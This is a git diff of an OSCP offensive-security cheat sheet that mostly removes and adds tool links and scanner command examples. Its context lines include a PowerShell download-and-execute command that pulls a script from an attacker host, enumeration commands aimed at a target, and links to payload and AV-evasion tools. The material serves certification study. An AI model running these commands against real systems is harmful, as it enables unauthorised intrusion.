@@ -110,7 +110,6 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 | Name | URL |
 | --- | --- |
 | Nmap | https://github.com/nmap/nmap |
-| Amass | https://github.com/OWASP/Amass |
 | pspy | https://github.com/DominicBreuker/pspy |
 | enum4linux | https://github.com/CiscoCXSecurity/enum4linux |
 | BloodHound | https://github.com/BloodHoundAD/BloodHound |
@@ -120,7 +119,6 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 
 | Name | URL |
 | --- | --- |
-| Nuclei | https://github.com/projectdiscovery/nuclei |
 | Sparta | https://github.com/SECFORCE/sparta |
 | nikto | https://github.com/sullo/nikto |
 
@@ -132,7 +130,6 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 | ysoserial | https://github.com/frohoff/ysoserial |
 | JSON Web Tokens | https://jwt.io/ |
 | httpx | https://github.com/projectdiscovery/httpx |
-| Hakrawler | https://github.com/hakluke/hakrawler |
 | Gobuster | https://github.com/OJ/gobuster |
 | ffuf | https://github.com/ffuf/ffuf |
 | Wfuzz | https://github.com/xmendez/wfuzz |
@@ -187,6 +184,7 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 | Evil-WinRM | https://github.com/Hackplayers/evil-winrm |
 | Metasploit | https://github.com/rapid7/metasploit-framework |
 | SharpCollection | https://github.com/Flangvik/SharpCollection |
+| PowerSharpPack | https://github.com/S3cur3Th1sSh1t/PowerSharpPack |
 
 ### Post Exploitation
 
@@ -211,7 +209,6 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 | Windows Privilege Escalation | https://github.com/frizb/Windows-Privilege-Escalation |
 | Windows Privilege Escalation Fundamentals | https://www.fuzzysecurity.com/tutorials/16.html |
 | Priv2Admin | https://github.com/gtworek/Priv2Admin |
-| SeBackupPrivilege | https://github.com/giuliano108/SeBackupPrivilege |
 
 ### CVEs
 
@@ -301,12 +298,8 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 | ysoserial | https://github.com/frohoff/ysoserial |
 | nishang | https://github.com/samratashok/nishang |
 | Shikata Ga Nai | https://github.com/EgeBalci/sgn |
-| charlotte | https://github.com/9emin1/charlotte |
-| Chimera | https://github.com/tokyoneon/Chimera |
 | unicorn | https://github.com/trustedsec/unicorn |
-| Mortar Loader | https://github.com/0xsp-SRD/mortar |
 | PowerLine | https://github.com/fullmetalcache/powerline |
-| TheFatRat | https://github.com/Screetsec/TheFatRat |
 | woodpecker | https://github.com/woodpecker-appstore/log4j-payload-generator |
 | marshalsec | https://github.com/mbechler/marshalsec |
 | AMSI.fail | http://amsi.fail |
@@ -534,14 +527,6 @@ IEX(New-Object Net.webclient).downloadString('http://<LHOST>:<LPORT>/jaws-enum.p
 ./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t <RHOST>
 ```
 
-#### Nuclei
-
-```c
-./nuclei -target https://<RHOST> -t nuclei-templates    # basic syntax with path to templates
-./nuclei -target https://<RHOST> -t nuclei-templates -rate-limit 5    # rate limiting
-./nuclei -target https://<RHOST> -t nuclei-templates -header 'User-Agent: OSCP-EXAM -H 'X-OSCP-EXAM: oscp_exam'    # set headers
-```
-
 ### Web Application Analysis
 
 #### Asset Discovery
@@ -665,14 +650,6 @@ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<RHOST> -x php,txt,h
 gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://<RHOST>:<RPORT>/ -b 200 -k --wildcard
 
 gobuster dns -d <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
-```
-
-#### Hakrawler
-
-```c
-hakrawler -url <RHOST> -depth 3
-hakrawler -url <RHOST> -depth 3 -plain
-hakrawler -url <RHOST> -depth 3 -plain | httpx -http-proxy http://127.0.0.1:8080
 ```
 
 #### Local File Inclusion (LFI)
